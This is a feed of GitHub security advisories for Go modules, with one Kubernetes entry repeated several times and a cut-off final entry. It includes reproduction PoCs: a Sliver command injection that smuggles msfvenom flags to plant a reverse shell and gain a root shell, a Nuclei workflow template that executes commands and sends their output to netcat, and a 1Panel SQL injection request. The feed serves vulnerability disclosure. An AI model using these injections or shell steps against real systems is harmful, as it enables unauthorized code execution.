{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Go modules",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/go.json",
    "description": "Security Advisory for Go modules on GitHub",
    "items": [
        {
            "content_html": "<p>A security issue was discovered in Kubernetes clusters with Windows nodes where BUILTIN\\Users&nbsp;may be able to read container logs and NT AUTHORITY\\Authenticated Users&nbsp;may be able to modify container logs.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-5321\">https://nvd.nist.gov/vuln/detail/CVE-2024-5321</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/126161\">https://github.com/kubernetes/kubernetes/issues/126161</a></li>\n<li><a href=\"https://groups.google.com/g/kubernetes-security-announce/c/81c0BHkKNt0\">https://groups.google.com/g/kubernetes-security-announce/c/81c0BHkKNt0</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/commit/23660a78ae462a6c8c75ac7ffd9af97550dda1aa\">https://github.com/kubernetes/kubernetes/commit/23660a78ae462a6c8c75ac7ffd9af97550dda1aa</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/commit/84beb2915fa28ae477fe0676be8ba94ccd2b811a\">https://github.com/kubernetes/kubernetes/commit/84beb2915fa28ae477fe0676be8ba94ccd2b811a</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/commit/90589b8f63d28bcd3db89749950ebc48ed07c190\">https://github.com/kubernetes/kubernetes/commit/90589b8f63d28bcd3db89749950ebc48ed07c190</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/commit/de2033033b1d202ecaaa79d41861a075df8b49c1\">https://github.com/kubernetes/kubernetes/commit/de2033033b1d202ecaaa79d41861a075df8b49c1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-82m2-cv7p-4m75\">https://github.com/advisories/GHSA-82m2-cv7p-4m75</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-82m2-cv7p-4m75",
            "title": "[k8s.io/kubernetes] Kubernetes sets incorrect permissions on Windows containers logs",
            "date_modified": "2024-07-18T21:58:16.000Z",
            "date_published": "2024-07-18T21:30:38.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-82m2-cv7p-4m75"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A security issue was discovered in Kubernetes clusters with Windows nodes where BUILTIN\\Users&nbsp;may be able to read container logs and NT AUTHORITY\\Authenticated Users&nbsp;may be able to modify container logs.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-5321\">https://nvd.nist.gov/vuln/detail/CVE-2024-5321</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/126161\">https://github.com/kubernetes/kubernetes/issues/126161</a></li>\n<li><a href=\"https://groups.google.com/g/kubernetes-security-announce/c/81c0BHkKNt0\">https://groups.google.com/g/kubernetes-security-announce/c/81c0BHkKNt0</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/commit/23660a78ae462a6c8c75ac7ffd9af97550dda1aa\">https://github.com/kubernetes/kubernetes/commit/23660a78ae462a6c8c75ac7ffd9af97550dda1aa</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/commit/84beb2915fa28ae477fe0676be8ba94ccd2b811a\">https://github.com/kubernetes/kubernetes/commit/84beb2915fa28ae477fe0676be8ba94ccd2b811a</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/commit/90589b8f63d28bcd3db89749950ebc48ed07c190\">https://github.com/kubernetes/kubernetes/commit/90589b8f63d28bcd3db89749950ebc48ed07c190</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/commit/de2033033b1d202ecaaa79d41861a075df8b49c1\">https://github.com/kubernetes/kubernetes/commit/de2033033b1d202ecaaa79d41861a075df8b49c1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-82m2-cv7p-4m75\">https://github.com/advisories/GHSA-82m2-cv7p-4m75</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-82m2-cv7p-4m75",
            "title": "[k8s.io/kubernetes] Kubernetes sets incorrect permissions on Windows containers logs",
            "date_modified": "2024-07-18T21:58:16.000Z",
            "date_published": "2024-07-18T21:30:38.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-82m2-cv7p-4m75"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A security issue was discovered in Kubernetes clusters with Windows nodes where BUILTIN\\Users&nbsp;may be able to read container logs and NT AUTHORITY\\Authenticated Users&nbsp;may be able to modify container logs.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-5321\">https://nvd.nist.gov/vuln/detail/CVE-2024-5321</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/126161\">https://github.com/kubernetes/kubernetes/issues/126161</a></li>\n<li><a href=\"https://groups.google.com/g/kubernetes-security-announce/c/81c0BHkKNt0\">https://groups.google.com/g/kubernetes-security-announce/c/81c0BHkKNt0</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/commit/23660a78ae462a6c8c75ac7ffd9af97550dda1aa\">https://github.com/kubernetes/kubernetes/commit/23660a78ae462a6c8c75ac7ffd9af97550dda1aa</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/commit/84beb2915fa28ae477fe0676be8ba94ccd2b811a\">https://github.com/kubernetes/kubernetes/commit/84beb2915fa28ae477fe0676be8ba94ccd2b811a</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/commit/90589b8f63d28bcd3db89749950ebc48ed07c190\">https://github.com/kubernetes/kubernetes/commit/90589b8f63d28bcd3db89749950ebc48ed07c190</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/commit/de2033033b1d202ecaaa79d41861a075df8b49c1\">https://github.com/kubernetes/kubernetes/commit/de2033033b1d202ecaaa79d41861a075df8b49c1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-82m2-cv7p-4m75\">https://github.com/advisories/GHSA-82m2-cv7p-4m75</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-82m2-cv7p-4m75",
            "title": "[k8s.io/kubernetes] Kubernetes sets incorrect permissions on Windows containers logs",
            "date_modified": "2024-07-18T21:58:16.000Z",
            "date_published": "2024-07-18T21:30:38.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-82m2-cv7p-4m75"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A security issue was discovered in Kubernetes clusters with Windows nodes where BUILTIN\\Users&nbsp;may be able to read container logs and NT AUTHORITY\\Authenticated Users&nbsp;may be able to modify container logs.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-5321\">https://nvd.nist.gov/vuln/detail/CVE-2024-5321</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/126161\">https://github.com/kubernetes/kubernetes/issues/126161</a></li>\n<li><a href=\"https://groups.google.com/g/kubernetes-security-announce/c/81c0BHkKNt0\">https://groups.google.com/g/kubernetes-security-announce/c/81c0BHkKNt0</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/commit/23660a78ae462a6c8c75ac7ffd9af97550dda1aa\">https://github.com/kubernetes/kubernetes/commit/23660a78ae462a6c8c75ac7ffd9af97550dda1aa</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/commit/84beb2915fa28ae477fe0676be8ba94ccd2b811a\">https://github.com/kubernetes/kubernetes/commit/84beb2915fa28ae477fe0676be8ba94ccd2b811a</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/commit/90589b8f63d28bcd3db89749950ebc48ed07c190\">https://github.com/kubernetes/kubernetes/commit/90589b8f63d28bcd3db89749950ebc48ed07c190</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/commit/de2033033b1d202ecaaa79d41861a075df8b49c1\">https://github.com/kubernetes/kubernetes/commit/de2033033b1d202ecaaa79d41861a075df8b49c1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-82m2-cv7p-4m75\">https://github.com/advisories/GHSA-82m2-cv7p-4m75</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-82m2-cv7p-4m75",
            "title": "[k8s.io/kubernetes] Kubernetes sets incorrect permissions on Windows containers logs",
            "date_modified": "2024-07-18T21:58:16.000Z",
            "date_published": "2024-07-18T21:30:38.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-82m2-cv7p-4m75"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"description\">Description</h2>\n<p>Sliver version 1.6.0 (prerelease) is vulnerable to RCE on the teamserver by a low-privileged \"operator\" user. The RCE is as the system root user.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>As described in a <a href=\"https://github.com/BishopFox/sliver/issues/65\">past issue</a>, \"there is a clear security boundary between the operator and server, an operator should not inherently be able to run commands or code on the server.\" An operator who exploited this vulnerability would be able to view all console logs, kick all other operators, view and modify files stored on the server, and ultimately delete the server.</p>\n<h2 id=\"reproduction\">Reproduction</h2>\n<p>First configure the Sliver server <a href=\"https://sliver.sh/docs?name=Multi-player+Mode\">in multiplayer mode and add an operator profile</a>.</p>\n<p>Next, compile a slightly older version of the Sliver client. The commit after 5016fb8d updates the Cobra command-line parsing library in the Sliver client to strictly validate command flags.</p>\n<pre><code>git checkout 5016fb8d\nVERSION=1.6.0 make client\n</code></pre>\n<p>The latest server version is targeted:</p>\n<pre><code>All hackers gain exalted\n[*] Server v1.6.0 - bdfd89167dd47aece2397c638d482f94f3f91cba\n[*] Client 1.6.0 - 5016fb8d7cdff38c79e22e8293e58300f8d3bd57\n[*] Welcome to the sliver shell, please type 'help' for options`\n</code></pre>\n<p>The exploit uses a command injection in the <code>generate msf-stager</code> to inject the <code>--out</code> flag to <code>msfvenom</code>. We overwrite Sliver's own go binary at <code>/root/.sliver/go/bin/go</code>:</p>\n<pre><code>sliver &gt; generate msf-stager --lhost 192.168.0.128 --lport 8888 --advanced --platform=linux&amp;--payload=linux/x64/shell_reverse_tcp&amp;--format=elf&amp;--out=/root/.sliver/go/bin/go\n\n[*] Sliver implant stager saved to: [...]\n</code></pre>\n<p>The other injected flags are to force a Linux payload, and not necessary if running the Sliver server on Windows.</p>\n<p>If you check the saved implant locally on the client, it's 0 bytes as the output got written to the file on the server instead.</p>\n<p>On the attacking machine, setup a netcat shell:</p>\n<pre><code>$ nc -lvp 8888\nListening on 0.0.0.0 8888\n</code></pre>\n<p>Trigger the stager by running a command which executes <code>/root/.sliver/go/bin/go</code>:</p>\n<pre><code>sliver &gt; generate beacon --mtls 1.2.3.4\n[*] Generating new windows/amd64 beacon implant binary (1m0s)\n[*] Symbol obfuscation is enabled\n ⠼  Compiling, please wait ...\n</code></pre>\n<p>A root shell will pop:</p>\n<pre><code>$ nc -lvp 8888\nListening on 0.0.0.0 8888\nConnection received on 192.168.0.183 39238\nwhoami\nroot\n</code></pre>\n<p>The vulnerable code was introduced in <a href=\"https://github.com/BishopFox/sliver/pull/1281\">https://github.com/BishopFox/sliver/pull/1281</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/BishopFox/sliver/security/advisories/GHSA-hc5w-gxxr-w8x8\">https://github.com/BishopFox/sliver/security/advisories/GHSA-hc5w-gxxr-w8x8</a></li>\n<li><a href=\"https://github.com/BishopFox/sliver/pull/1281\">https://github.com/BishopFox/sliver/pull/1281</a></li>\n<li><a href=\"https://github.com/BishopFox/sliver/commit/0deaee625d14c6f05f63c86e5c3b7ae623a1138f\">https://github.com/BishopFox/sliver/commit/0deaee625d14c6f05f63c86e5c3b7ae623a1138f</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-41111\">https://nvd.nist.gov/vuln/detail/CVE-2024-41111</a></li>\n<li><a href=\"https://github.com/BishopFox/sliver/issues/65\">https://github.com/BishopFox/sliver/issues/65</a></li>\n<li><a href=\"https://github.com/BishopFox/sliver/commit/5016fb8d7cdff38c79e22e8293e58300f8d3bd57\">https://github.com/BishopFox/sliver/commit/5016fb8d7cdff38c79e22e8293e58300f8d3bd57</a></li>\n<li><a href=\"https://sliver.sh/docs?name=Multi-player+Mode\">https://sliver.sh/docs?name=Multi-player+Mode</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hc5w-gxxr-w8x8\">https://github.com/advisories/GHSA-hc5w-gxxr-w8x8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hc5w-gxxr-w8x8",
            "title": "[github.com/bishopfox/sliver] Sliver Allows Authenticated Operator-to-Server Remote Code Execution",
            "date_modified": "2024-07-19T14:04:52.000Z",
            "date_published": "2024-07-18T20:23:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hc5w-gxxr-w8x8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>There are many sql injections in the project, and some of them are not well filtered, leading to arbitrary file writes, and ultimately leading to RCEs.\nThe proof is as follows</p>\n<h3 id=\"details-（one-of-them-）\">Details （one of them ）</h3>\n<img src=\"https://github.com/1Panel-dev/1Panel/assets/129351704/895b7b43-9bc0-44b3-9c84-24c2dcc962da\" alt=\"image\" width=\"697\">\n<img src=\"https://github.com/1Panel-dev/1Panel/assets/129351704/1b8eb866-9865-4bef-a359-53335d709157\" alt=\"image\" width=\"936\">\n<img src=\"https://github.com/1Panel-dev/1Panel/assets/129351704/e865d6d0-7ecb-49f7-b4a2-f1b0bc407986\" alt=\"image\" width=\"684\">\n\n\n<h3 id=\"poc\">PoC</h3>\n<p>curl '<a href=\"http://api:30455/api/v1/hosts/command/search\">http://api:30455/api/v1/hosts/command/search</a>' {\"page\":1,\"pageSize\":10,\"groupID\":0,\"orderBy\":\"<strong>3</strong>\",\"order\":\"ascending\",\"name\":\"a\"}\n<img src=\"https://github.com/1Panel-dev/1Panel/assets/129351704/250d5a2a-cb32-44dc-9831-86dbc2f2b43f\" alt=\"image\" width=\"664\">\nfor example as picture . just change orderby‘s num we can know How many columns does the data table have.Parameters require strict whitelist filtering</p>\n<h3 id=\"impact\">Impact</h3>\n<p>RCE、data leak.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-5grx-v727-qmq6\">https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-5grx-v727-qmq6</a></li>\n<li><a href=\"https://github.com/1Panel-dev/1Panel/commit/ff549a47937c1314e6ee08453a1d2128242440cd\">https://github.com/1Panel-dev/1Panel/commit/ff549a47937c1314e6ee08453a1d2128242440cd</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-39907\">https://nvd.nist.gov/vuln/detail/CVE-2024-39907</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5grx-v727-qmq6\">https://github.com/advisories/GHSA-5grx-v727-qmq6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5grx-v727-qmq6",
            "title": "[github.com/1Panel-dev/1Panel] 1Panel has an SQL injection issue related to the orderBy clause",
            "date_modified": "2024-07-18T19:45:47.000Z",
            "date_published": "2024-07-18T14:25:00.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5grx-v727-qmq6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Find a way to execute code template without -code option and signature.</p>\n<h3 id=\"details\">Details</h3>\n<p>write a <code>code.yaml</code>:</p>\n<pre><code class=\"language-yaml\">id: code\n\ninfo:\n  name: example code template\n  author: ovi3\n\n\ncode:\n  - engine:\n      - sh\n      - bash\n    source: |\n      id\n\nhttp:\n  - raw:\n      - |\n        POST /re HTTP/1.1\n        Host: {{Hostname}}\n\n        {{code_response}}\n\nworkflows:\n  - matchers:\n    - name: t\n</code></pre>\n<p>using nc to listen on 80:</p>\n<pre><code class=\"language-bash\">nc -lvvnp 80\n</code></pre>\n<p>execute PoC template with nuclei:</p>\n<pre><code class=\"language-bash\">./nuclei -disable-update-check  -w code.yaml -u http://127.0.0.1 -vv -debug\n</code></pre>\n<p>and nc will get <code>id</code> command output.</p>\n<p>We use <code>-w</code> to specify a workflow file, not <code>-t</code> to template file. and notice there is a <code>workflows</code> field in code.yaml to pretend to be a workflow file.</p>\n<p>Test in Linux and Nuclei v3.2.9</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Some web applications inherit from Nuclei and allow users to edit and execute workflow files. In this case, users can execute arbitrary commands. (Although, as far as I know, most web applications use -t to execute)</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/projectdiscovery/nuclei/security/advisories/GHSA-c3q9-c27p-cw9h\">https://github.com/projectdiscovery/nuclei/security/advisories/GHSA-c3q9-c27p-cw9h</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-40641\">https://nvd.nist.gov/vuln/detail/CVE-2024-40641</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c3q9-c27p-cw9h\">https://github.com/advisories/GHSA-c3q9-c27p-cw9h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c3q9-c27p-cw9h",
            "title": "[github.com/projectdiscovery/nuclei/v3] projectdiscovery/nuclei allows unsigned code template execution through workflows",
            "date_modified": "2024-07-17T19:32:24.000Z",
            "date_published": "2024-07-17T19:32:23.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c3q9-c27p-cw9h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>For Cilium users who have enabled <a href=\"https://docs.cilium.io/en/stable/installation/k8s-install-external-etcd/#when-do-i-need-to-use-a-kvstore\">an external kvstore</a> and <a href=\"https://docs.cilium.io/en/stable/security/network/encryption-wireguard/#encryption-wg\">Wireguard transparent encryption</a>, traffic between pods in the affected cluster is not encrypted.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This issue affects Cilium v1.14 before v1.14.7.</p>\n<p>This issue has been patched in Cilium v1.14.7.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There is no workaround to this issue - affected users are encouraged to upgrade.</p>\n<h3 id=\"acknowledgements\">Acknowledgements</h3>\n<p>The Cilium community has worked together with members of Isovalent to prepare these mitigations. Special thanks to @giorio94 and @gandro for their work on triaging and remediating this issue.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory, please reach out on <a href=\"https://docs.cilium.io/en/latest/community/community/#slack\">Slack</a>.</p>\n<p>If you think you found a related vulnerability, we strongly encourage you to report security vulnerabilities to our private security mailing list at <a href=\"mailto:security@cilium.io\">security@cilium.io</a>. This is a private mailing list where only members of the Cilium internal security team are subscribed to, and your report will be treated as top priority.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cilium/cilium/security/advisories/GHSA-x989-52fc-4vr4\">https://github.com/cilium/cilium/security/advisories/GHSA-x989-52fc-4vr4</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-25631\">https://nvd.nist.gov/vuln/detail/CVE-2024-25631</a></li>\n<li><a href=\"https://docs.cilium.io/en/stable/installation/k8s-install-external-etcd/#when-do-i-need-to-use-a-kvstore\">https://docs.cilium.io/en/stable/installation/k8s-install-external-etcd/#when-do-i-need-to-use-a-kvstore</a></li>\n<li><a href=\"https://docs.cilium.io/en/stable/security/network/encryption-wireguard/#encryption-wg\">https://docs.cilium.io/en/stable/security/network/encryption-wireguard/#encryption-wg</a></li>\n<li><a href=\"https://github.com/cilium/cilium/releases/tag/v1.14.7\">https://github.com/cilium/cilium/releases/tag/v1.14.7</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x989-52fc-4vr4\">https://github.com/advisories/GHSA-x989-52fc-4vr4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x989-52fc-4vr4",
            "title": "[github.com/cilium/cilium] Unencrypted traffic between pods when using Wireguard and an external kvstore",
            "date_modified": "2024-07-17T17:13:38.000Z",
            "date_published": "2024-02-20T23:45:16.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x989-52fc-4vr4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>For Cilium users who are using CRDs to store Cilium state (the default configuration) and <a href=\"https://docs.cilium.io/en/stable/security/network/encryption-wireguard/#encryption-wg\">Wireguard transparent encryption</a>, responses from pods to the Ingress and health endpoints are not encrypted. Traffic from the Ingress and health endpoints to pods is not affected by this issue. The health endpoint is only used for Cilium's internal health checks.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This issue affects Cilium v1.14 before v1.14.7.</p>\n<p>This issue has been patched in Cilium v1.14.7.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There is no workaround to this issue - affected users are encouraged to upgrade.</p>\n<h3 id=\"acknowledgements\">Acknowledgements</h3>\n<p>The Cilium community has worked together with members of Isovalent to prepare these mitigations. Special thanks to @gandro for their work on triaging and remediating this issue.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory, please reach out on <a href=\"https://docs.cilium.io/en/latest/community/community/#slack\">Slack</a>.</p>\n<p>If you think you have found a vulnerability affecting Cilium, we strongly encourage you to report it to our security mailing list at <a href=\"mailto:security@cilium.io\">security@cilium.io</a>. This is a private mailing list where only members of the Cilium internal security team are subscribed to, and your report will be treated as top priority.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cilium/cilium/security/advisories/GHSA-7496-fgv9-xw82\">https://github.com/cilium/cilium/security/advisories/GHSA-7496-fgv9-xw82</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-25630\">https://nvd.nist.gov/vuln/detail/CVE-2024-25630</a></li>\n<li><a href=\"https://docs.cilium.io/en/stable/security/network/encryption-wireguard/#encryption-wg\">https://docs.cilium.io/en/stable/security/network/encryption-wireguard/#encryption-wg</a></li>\n<li><a href=\"https://github.com/cilium/cilium/releases/tag/v1.14.7\">https://github.com/cilium/cilium/releases/tag/v1.14.7</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7496-fgv9-xw82\">https://github.com/advisories/GHSA-7496-fgv9-xw82</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7496-fgv9-xw82",
            "title": "[github.com/cilium/cilium] Unencrypted ingress/health traffic when using Wireguard transparent encryption",
            "date_modified": "2024-07-17T17:12:56.000Z",
            "date_published": "2024-02-20T23:44:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7496-fgv9-xw82"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A flaw was found in Skupper. When Skupper is initialized with the console-enabled and with console-auth set to Openshift, it configures the openshift oauth-proxy with a static cookie-secret. In certain circumstances, this may allow an attacker to bypass authentication to the Skupper console via a specially-crafted cookie.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-6535\">https://nvd.nist.gov/vuln/detail/CVE-2024-6535</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2024-6535\">https://access.redhat.com/security/cve/CVE-2024-6535</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2296024\">https://bugzilla.redhat.com/show_bug.cgi?id=2296024</a></li>\n<li><a href=\"https://github.com/skupperproject/skupper/commit/d2cb3782e807853694ee66b6e3d4a1917485eb71\">https://github.com/skupperproject/skupper/commit/d2cb3782e807853694ee66b6e3d4a1917485eb71</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-w799-v85j-88pg\">https://github.com/advisories/GHSA-w799-v85j-88pg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-w799-v85j-88pg",
            "title": "[github.com/skupperproject/skupper] Skupper uses a static cookie secret for the openshift oauth-proxy",
            "date_modified": "2024-07-17T16:01:11.000Z",
            "date_published": "2024-07-17T03:31:38.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-w799-v85j-88pg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Vault and Vault Enterprise did not properly handle requests originating from unauthorized IP addresses when the TCP listener option, proxy_protocol_behavior, was set to deny_unauthorized. When receiving a request from a source IP address that was not listed in proxy_protocol_authorized_addrs, the Vault API server would shut down and no longer respond to any HTTP requests, potentially resulting in denial of service.</p>\n<p>While this bug also affected versions of Vault up to 1.17.1 and 1.16.5, a separate regression in those release series did not allow Vault operators to configure the deny_unauthorized option, thus not allowing the conditions for the denial of service to occur.</p>\n<p>Fixed in Vault and Vault Enterprise 1.17.2, 1.16.6, and 1.15.12.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-6468\">https://nvd.nist.gov/vuln/detail/CVE-2024-6468</a></li>\n<li><a href=\"https://discuss.hashicorp.com/t/hcsec-2024-14-vault-vulnerable-to-denial-of-service-when-setting-a-proxy-protocol-behavior/68518\">https://discuss.hashicorp.com/t/hcsec-2024-14-vault-vulnerable-to-denial-of-service-when-setting-a-proxy-protocol-behavior/68518</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2qmw-pvf7-4mw6\">https://github.com/advisories/GHSA-2qmw-pvf7-4mw6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2qmw-pvf7-4mw6",
            "title": "[github.com/hashicorp/vault] Hashicorp Vault vulnerable to Improper Check or Handling of Exceptional Conditions ",
            "date_modified": "2024-07-16T17:33:40.000Z",
            "date_published": "2024-07-11T21:31:13.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2qmw-pvf7-4mw6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Applications using the <code>zitadel-go</code> <code>v3</code> library (<code>next</code> branch) might be impacted by package vulnerabilities.\nThe output of <code>govulncheck</code> suggests that only <code>example</code> code seems to be impacted, based on 1 of the 3 potential vulnerabilities. This vulnerability is located in the transitive dependency <code>golang.org/x/net v0.19.0</code>, <a href=\"https://www.cve.org/CVERecord?id=CVE-2023-45288\">CVE-2023-45288</a></p>\n<h3 id=\"patches\">Patches</h3>\n<p>3.0.0-next versions are fixed on &gt;= <a href=\"https://github.com/zitadel/zitadel-go/releases/tag/v3.0.0-next.3\">3.0.0-next.3</a></p>\n<p>ZITADEL recommends upgrading to the latest versions available in due course.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If updating the zitadel-go library is not an option, updating the affected (transient) dependencies works as a workaround.</p>\n<h3 id=\"details\">Details</h3>\n<h4 id=\"direct-deps\">Direct deps:</h4>\n<ul>\n<li><a href=\"https://pkg.go.dev/vuln/GO-2024-2631\">GO-2024-2631</a> Decompression bomb vulnerability in github.com/go-jose/go-jose<ul>\n<li>github.com/go-jose/go-jose/v3 Fixed in v3.0.3.</li>\n</ul>\n</li>\n</ul>\n<p>This module is necessary because <a href=\"https://pkg.go.dev/github.com/go-jose/go-jose/v3@v3.0.1\">github.com/go-jose/go-jose/v3</a> is imported in <code>github.com/zitadel/zitadel-go/v3/pkg/client/system</code>.</p>\n<ul>\n<li><a href=\"https://pkg.go.dev/vuln/GO-2024-2611\">GO-2024-2611</a> Infinite loop in JSON unmarshaling in google.golang.org/protobuf<ul>\n<li>google.golang.org/protobuf/encoding/protojson</li>\n<li>google.golang.org/protobuf/internal/encoding/json Fixed in v1.33.0.</li>\n</ul>\n</li>\n</ul>\n<p>This module is necessary because <a href=\"https://pkg.go.dev/google.golang.org/protobuf@v1.31.0/reflect/protoreflect\">google.golang.org/protobuf/reflect/protoreflect</a> is imported in <code>github.com/zitadel/zitadel-go/v3/example/api/grpc/proto</code>.</p>\n<h4 id=\"transitive-deps\">Transitive deps:</h4>\n<ul>\n<li><a href=\"https://pkg.go.dev/vuln/GO-2024-2687\">GO-2024-2687</a> HTTP/2 CONTINUATION flood in net/http<ul>\n<li>golang.org/x/net/http2 Fixed in v0.23.0.</li>\n</ul>\n</li>\n</ul>\n<p>This module is necessary because <a href=\"https://pkg.go.dev/golang.org/x/net@v0.19.0/trace\">golang.org/x/net/trace</a> is imported in:</p>\n<ul>\n<li><code>github.com/zitadel/zitadel-go/v3/example/api/grpc</code></li>\n<li><code>google.golang.org/grpc</code></li>\n</ul>\n<h4 id=\"govulncheck\"><code>govulncheck</code></h4>\n<pre><code class=\"language-console\">=== Symbol Results ===\n\nVulnerability #1: GO-2024-2687\n    HTTP/2 CONTINUATION flood in net/http\n  More info: https://pkg.go.dev/vuln/GO-2024-2687\n  Module: golang.org/x/net\n    Found in: golang.org/x/net@v0.19.0\n    Fixed in: golang.org/x/net@v0.23.0\n    Example traces found:\n      #1: example/api/grpc/proto/api_grpc.pb.go:239:34: proto.exampleServiceAddTasksServer.Recv calls grpc.serverStream.RecvMsg, which eventually calls http2.ConnectionError.Error\n      #2: pkg/client/auth.go:92:20: client.ScopeProjectID calls fmt.Sprintf, which eventually calls http2.ErrCode.String\n      #3: pkg/client/auth.go:92:20: client.ScopeProjectID calls fmt.Sprintf, which eventually calls http2.FrameHeader.String\n      #4: pkg/client/auth.go:92:20: 